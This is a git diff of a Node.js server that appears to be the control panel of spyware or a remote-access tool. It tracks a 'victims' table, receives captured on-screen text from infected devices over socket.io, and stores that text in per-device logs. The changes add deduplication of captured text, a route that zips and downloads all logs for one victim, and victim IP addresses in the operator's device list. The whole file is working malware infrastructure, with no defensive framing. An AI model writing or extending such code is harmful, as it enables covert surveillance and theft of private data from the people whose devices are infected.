@@ -1,5 +1,5 @@
 import 'dotenv/config.js'
-
+import nodeZip from 'node-zip';
 import express from "express";
 import { Server } from "socket.io";
 import bodyParser from 'body-parser';
@@ -19,44 +19,47 @@ const __dirname = path.dirname(__filename);
 
 const logsDir = path.join(__dirname, 'logresults'); // Directory where files are stored
 
+const seenEntries = new Set(); // Global set to track seen entries
+
 function appendLog(logMessage, fileName) {
+    const match = logMessage.match(/Onscreen Text : (.*)/); // Check for "Onscreen Text"
+
+    if (match) { // Only process "Onscreen Text" entries
+        const entry = match[1].trim();
+        if (seenEntries.has(entry)) { // Duplicate check
+            console.log("Duplicate entry ignored"); 
+            return; // Skip appending
+        } else {
+            seenEntries.add(entry); 
+        }
+    }
+
     const now = new Date();
     const year = now.getFullYear();
-    const month = (now.getMonth() + 1).toString().padStart(2, '0'); // Month is zero-indexed
+    const month = (now.getMonth() + 1).toString().padStart(2, '0');
     const day = now.getDate().toString().padStart(2, '0');
     const logFilePath = path.join(logsDir, fileName) + ` | ${year}-${month}-${day}` + ".txt";
 
-    // Check if the file exists
+    // Read existing entries if the file exists
     fs.readFile(logFilePath, 'utf8', (err, data) => {
-        if (err && err.code === 'ENOENT') {
-          // File doesn't exist, so create it and write the log message
-          fs.writeFile(logFilePath, logMessage + '\n', (err) => {
-            if (err) throw err;
-            console.log('Log file created and log appended.');
-          });
-        } else if (err) {
-          console.error('Error reading the log file:', err);
-        } else {
-          // File exists, check if the log message is already there
-          const entries = data.split('Onscreen Text').filter(entry => entry.trim() !== '');
-          const logMessageExists = entries.some(entry => entry.includes(logMessage.trim()));
-    
-          if (!logMessageExists) {
-            // Log message does not exist, append it
-            fs.appendFile(logFilePath, logMessage + '\n', (writeErr) => {
-              if (writeErr) {
-                //console.error('Error appending to the log file:', writeErr);
-                return;
-              }
-              //console.log('New data appended successfully.');
+        if (!err) {
+            data.split('\n').forEach(line => {
+                const existingMatch = line.match(/Onscreen Text : (.*)/);
+                if (existingMatch) {
+                    seenEntries.add(existingMatch[1].trim());
+                }
             });
-          } else {
-            // Log message exists, handle as needed
-            //console.log('Data already exists in the log.');
-            return null;
-          }
         }
-      });
+
+        // Append the log message
+        fs.appendFile(logFilePath, logMessage + '\n', (writeErr) => {
+            if (writeErr) {
+                console.error('Error appending log:', writeErr);
+            } else {
+                //console.log('Log appended successfully.');
+            }
+        });
+    });
 }
 
 async function queryDatabase(querysql) {
@@ -186,6 +189,31 @@ app.get('/download/:fileName', (req, res) => {
     });
 });
 
+app.get('/download-all/:id', (req, res) => {
+    const id = req.params.id;
+    fs.readdir(logsDir, (err, files) => {
+        if (err) {
+            console.log(err);
+            return res.status(500).send('Server error');
+        }
+
+        const matchingFiles = files.filter(file => file.startsWith(id));
+        if (matchingFiles.length === 0) {
+            return res.status(404).send('No files found for the given ID');
+        }
+        const zip = new nodeZip();
+        matchingFiles.forEach(file => {
+            const filePath = path.join(logsDir, file);
+            zip.file(file, fs.readFileSync(filePath));
+        });
+
+        const data = zip.generate({ base64: false, compression: 'DEFLATE' });
+        res.set('Content-Type', 'application/zip');
+        res.set('Content-Disposition', `attachment; filename=${id}_files.zip`);
+        res.send(Buffer.from(data, 'binary'));
+    });
+});
+
 app.get('/content/:fileName', async (req, res) => {
     const fileName = req.params.fileName;
     const filePath = path.join(logsDir, fileName);
@@ -273,7 +301,6 @@ botIo.on("connection", async (socket) => {
                 }
             })
             //masterIo.emit("logger", data)
-            appendLog(datalog, data.DeviceID + " | " + data.DeviceName)
         } catch (err) {
             console.error(err)
         }
@@ -344,7 +371,7 @@ masterIo.on("connection", (socket) => {
 
 
 function getRemaining() {
-    queryDatabase("SELECT ID, Brand, Model, HWID, isOnline, DeviceName FROM victims")
+    queryDatabase("SELECT ID, Brand, Model, HWID, isOnline, IP, DeviceName FROM victims")
         .then(result => {
             if (result.length > 0) {
                 masterIo.emit("info", result);
